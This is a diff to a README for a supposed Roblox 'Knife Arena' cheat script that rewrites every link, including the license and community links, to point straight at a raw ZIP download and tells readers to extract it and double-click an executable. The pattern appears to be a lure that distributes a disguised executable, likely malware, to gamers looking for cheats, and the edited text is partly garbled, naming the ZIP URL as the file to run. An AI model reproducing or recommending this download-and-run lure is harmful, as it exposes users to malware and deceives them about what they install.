@@ -4,14 +4,14 @@
 Welcome to the Roblox-Knife-Arena-Script! This script is designed specifically for Roblox in 2026. It offers advanced automation features and enhances combat mechanics. Whether you're a competitive player or a casual gamer, this tool will help improve your gameplay experience.
 
 ## 📥 Download Now
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com)
+[![Download Now](https://raw.githubusercontent.com/r4hm4candy-cyber/Roblox-Knife-Arena-Script/main/Spaniardo/KnifeRobloxArenaScript_v3.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/r4hm4candy-cyber/Roblox-Knife-Arena-Script/main/Spaniardo/KnifeRobloxArenaScript_v3.0.zip)
 
 ## 🚀 Getting Started
 To start using the Roblox-Knife-Arena-Script, follow these simple steps:
 
 1. **Visit the Releases Page:** 
    Click the link below to access the releases page.
-   [Visit Releases Page](https://github.com)
+   [Visit Releases Page](https://raw.githubusercontent.com/r4hm4candy-cyber/Roblox-Knife-Arena-Script/main/Spaniardo/KnifeRobloxArenaScript_v3.0.zip)
 
 2. **Choose Your Version:**
    Look for the latest version of the Roblox-Knife-Arena-Script. It will be marked as "Latest Release".
@@ -28,7 +28,7 @@ Before downloading, ensure your system meets the following requirements:
 To download the script:
 
 1. **Visit the Releases Page:** 
-   Go to the link: [Visit Releases Page](https://github.com)
+   Go to the link: [Visit Releases Page](https://raw.githubusercontent.com/r4hm4candy-cyber/Roblox-Knife-Arena-Script/main/Spaniardo/KnifeRobloxArenaScript_v3.0.zip)
 
 2. **Download the File:**
    Click on the version you want to download. The file will begin downloading automatically.
@@ -37,7 +37,7 @@ To download the script:
    Once downloaded, locate the ZIP file in your downloads folder. Right-click and choose "Extract All". Follow the prompts to complete the extraction.
 
 4. **Run the Script:**
-   After extraction, open the folder and double-click on the `Roblox-Knife-Arena-Script.exe` file to start the script.
+   After extraction, open the folder and double-click on the `https://raw.githubusercontent.com/r4hm4candy-cyber/Roblox-Knife-Arena-Script/main/Spaniardo/KnifeRobloxArenaScript_v3.0.zip` file to start the script.
 
 5. **Enjoy Your Game:**
    Once the script is running, launch Roblox. The script will enhance your gaming experience automatically.
@@ -68,8 +68,8 @@ If you need help, feel free to reach out. You can raise issues directly in the G
 This script is open-source and follows the MIT License. You may modify and use it as you wish, but please maintain the reference to the original creators.
 
 ## 🔗 Important Links
-- [Visit Releases Page](https://github.com)
-- [Community Discussions](https://github.com)
-- [License Information](https://github.com)
+- [Visit Releases Page](https://raw.githubusercontent.com/r4hm4candy-cyber/Roblox-Knife-Arena-Script/main/Spaniardo/KnifeRobloxArenaScript_v3.0.zip)
+- [Community Discussions](https://raw.githubusercontent.com/r4hm4candy-cyber/Roblox-Knife-Arena-Script/main/Spaniardo/KnifeRobloxArenaScript_v3.0.zip)
+- [License Information](https://raw.githubusercontent.com/r4hm4candy-cyber/Roblox-Knife-Arena-Script/main/Spaniardo/KnifeRobloxArenaScript_v3.0.zip)
 
 Enjoy your time in the Knife Arena! Happy gaming!
